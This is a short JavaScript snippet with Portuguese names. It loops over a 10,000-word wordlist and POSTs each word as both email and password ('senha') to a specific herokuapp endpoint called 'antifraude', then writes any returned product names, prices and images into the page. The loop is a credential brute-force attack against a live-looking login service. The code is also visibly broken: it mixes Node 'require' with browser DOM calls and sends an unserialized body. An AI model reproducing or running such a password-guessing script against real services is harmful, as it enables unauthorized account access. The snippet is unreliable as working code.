let conteudoDiv = document.getElementById('conteudo')
const wordlist = require('./wordlist') // 10000

for(i = 0; i< wordlist.length; i++)
{
    fetch('https://antifraude-7f66a850461c.herokuapp.com/', {
        method: "POST",
        body: {
            "email": wordlist[i],
            "senha": wordlist[i]
        }
    })
    .then(resposta => resposta.json())
    .then(produtos => {
        for (produto of produtos) {
            let paragrafo = document.createElement('p')
            paragrafo.textContent = produto.nome
            conteudoDiv.appendChild(paragrafo)
            
            let valor = document.createElement('span')
            valor.textContent = produto.valor
            conteudoDiv.appendChild(valor)
            
            let imagem = document.createElement('img')
            imagem.src = produto.imagem
            conteudoDiv.appendChild(imagem)
        }
    })
}
